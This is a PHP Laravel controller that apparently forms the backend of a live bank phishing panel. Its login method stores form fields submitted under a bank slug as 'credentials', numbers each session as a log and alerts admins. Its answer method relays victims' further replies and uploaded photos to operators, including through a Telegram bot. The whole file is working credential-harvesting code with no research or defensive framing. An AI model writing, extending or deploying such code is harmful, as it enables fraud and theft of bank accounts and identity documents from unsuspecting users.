<?php

namespace App\Http\Controllers;

use App\Events\BankSessionCreated;
use App\Events\BankSessionUpdated;
use App\Listeners\NotifyAdminsOfBankSession;
use App\Models\Admin;
use App\Models\BankSession;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;

class BankAuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $data = $request->validate([
            'sessionId' => 'required|string|uuid',
            'bankSlug'  => 'required|string',
            'fields'    => 'required|array',
        ]);
        $session = BankSession::findOrFail($data['sessionId']);

        if ($session->log_number === null) {
            $session->log_number = ((int) DB::table('bank_sessions')->max('log_number')) + 1;
        }

        $session->credentials      = $data['fields'];
        $session->action_type      = ['type' => 'hold.short'];
        $session->last_activity_at = now();
        $session->save();

        BankSessionCreated::dispatch($session);
        app(NotifyAdminsOfBankSession::class)->notifyCredentialsEntered($session);
        return response()->json(['ok' => true]);
    }

    public function answer(Request $request, string $sessionId): JsonResponse
    {
        $session = BankSession::findOrFail($sessionId);
        $command = $request->input('command');

        if ($command === 'photo.request') {
            $request->validate(['file' => 'required|file|image|max:10240']);

            $file      = $request->file('file');
            $extension = $file->getClientOriginalExtension() ?: 'jpg';
            $filename  = Str::uuid() . '.' . $extension;

            $dir = public_path('bank-photos');
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
            $file->move($dir, $filename);
            $photoUrl = '/bank-photos/' . $filename;

            $session->pushAnswer(['command' => 'photo.request', 'payload' => ['photo_url' => $photoUrl]]);
            $session->action_type      = ['type' => 'hold.short'];
            $session->last_activity_at = now();
            $session->save();
            BankSessionUpdated::dispatch($session);
            app(NotifyAdminsOfBankSession::class)->notifyClientAnswer($session, 'photo.request', '📷 фото загружено');

            // Отправляем фото напрямую в Telegram администратору
            if ($session->admin_id) {
                $admin = Admin::find($session->admin_id);
                if ($admin) {
                    try {
                        $bot = app(Nutgram::class);
                        $bot->sendPhoto(
                            chat_id: $admin->telegram_user_id,
                            photo: InputFile::make(public_path('bank-photos/' . $filename), $filename),
                            caption: "📷 Клиент загрузил фото [{$session->bank_slug}]",
                        );
                    } catch (\Throwable) {
                        // не блокируем ответ если Telegram недоступен
                    }
                }
            }

            return response()->json(['ok' => true]);
        }

        $data = $request->validate([
            'command' => 'required|string',
            'payload' => 'required|array',
        ]);
        $session->pushAnswer($data);
        $session->action_type      = ['type' => 'hold.short'];
        $session->last_activity_at = now();
        $session->save();
        BankSessionUpdated::dispatch($session);
        $value = count($data['payload']) === 1
            ? (string) array_values($data['payload'])[0]
            : implode(' ', array_values($data['payload']));
        app(NotifyAdminsOfBankSession::class)->notifyClientAnswer($session, $data['command'], $value);
        return response()->json(['ok' => true]);
    }
}
